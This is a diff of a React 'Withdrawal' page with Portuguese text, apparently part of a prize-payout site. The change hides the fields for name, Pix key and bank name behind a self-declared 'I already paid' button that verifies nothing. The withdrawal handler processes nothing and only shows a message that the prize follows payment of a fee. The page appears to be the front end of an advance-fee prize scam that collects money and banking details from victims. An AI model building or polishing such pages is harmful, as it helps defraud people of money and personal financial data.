@@ -16,6 +16,12 @@ const Withdrawal = () => {
   const [fullName, setFullName] = useState("");
   const [bankPixKey, setBankPixKey] = useState("");
   const [bankName, setBankName] = useState("");
+  const [paymentConfirmed, setPaymentConfirmed] = useState(false); // Novo estado para confirmação de pagamento
+
+  const handleConfirmPayment = () => {
+    setPaymentConfirmed(true);
+    toast.info("Agora preencha seus dados para receber o Pix.");
+  };
 
   const handleConfirmWithdrawal = () => {
     if (!fullName || !bankPixKey || !bankName) {
@@ -23,10 +29,11 @@ const Withdrawal = () => {
       return;
     }
     // Aqui você poderia adicionar a lógica para processar o saque
-    // Por enquanto, apenas navegaremos para a página de sucesso
     toast.success("Informações de saque enviadas! Seu prêmio será processado após o pagamento da taxa.");
     navigate("/withdrawal-success"); // Navega para a nova página de sucesso
   };
+
+  const isWithdrawalButtonDisabled = !fullName || !bankPixKey || !bankName;
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-teal-500 to-cyan-600 text-white p-4">
@@ -74,45 +81,56 @@ const Withdrawal = () => {
             </p>
           </div>
 
-          <div className="space-y-4 mb-6">
-            <p className="text-center text-md text-gray-800 font-semibold">
-              Preencha seus dados para receber o Pix:
-            </p>
-            <Input
-              type="text"
-              placeholder="Nome Completo"
-              value={fullName}
-              onChange={(e) => setFullName(e.target.value)}
-              className="text-center text-lg py-6"
-            />
-            <Input
-              type="text"
-              placeholder="Sua Chave Pix Bancária"
-              value={bankPixKey}
-              onChange={(e) => setBankPixKey(e.target.value)}
-              className="text-center text-lg py-6"
-            />
-            <Input
-              type="text"
-              placeholder="Nome do Seu Banco"
-              value={bankName}
-              onChange={(e) => setBankName(e.target.value)}
-              className="text-center text-lg py-6"
-            />
-            <p className="text-center text-sm text-gray-600">
-              As informações são necessárias para que o Pix seja efetuado na sua conta correta.
-            </p>
-          </div>
+          {!paymentConfirmed && (
+            <Button
+              onClick={handleConfirmPayment}
+              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
+            >
+              Já efetuei o pagamento
+            </Button>
+          )}
 
-          <p className="text-center text-md text-gray-800">
-            Após a confirmação do pagamento da taxa, seu prêmio será enviado via Pix em até 30 minutos.
-          </p>
-          <Button
-            onClick={handleConfirmWithdrawal}
-            className="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
-          >
-            Confirmar Saque
-          </Button>
+          {paymentConfirmed && (
+            <div className="space-y-4 mt-6 mb-6">
+              <p className="text-center text-md text-gray-800 font-semibold">
+                Preencha seus dados para receber o Pix:
+              </p>
+              <Input
+                type="text"
+                placeholder="Nome Completo"
+                value={fullName}
+                onChange={(e) => setFullName(e.target.value)}
+                className="text-center text-lg py-6"
+              />
+              <Input
+                type="text"
+                placeholder="Sua Chave Pix Bancária"
+                value={bankPixKey}
+                onChange={(e) => setBankPixKey(e.target.value)}
+                className="text-center text-lg py-6"
+              />
+              <Input
+                type="text"
+                placeholder="Nome do Seu Banco"
+                value={bankName}
+                onChange={(e) => setBankName(e.target.value)}
+                className="text-center text-lg py-6"
+              />
+              <p className="text-center text-sm text-gray-600">
+                As informações são necessárias para que o Pix seja efetuado na sua conta correta.
+              </p>
+              <p className="text-center text-md text-gray-800 mt-6">
+                Após a confirmação do pagamento da taxa, seu prêmio será enviado via Pix em até 30 minutos.
+              </p>
+              <Button
+                onClick={handleConfirmWithdrawal}
+                disabled={isWithdrawalButtonDisabled}
+                className="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
+              >
+                Confirmar Saque
+              </Button>
+            </div>
+          )}
         </CardContent>
       </Card>
     </div>
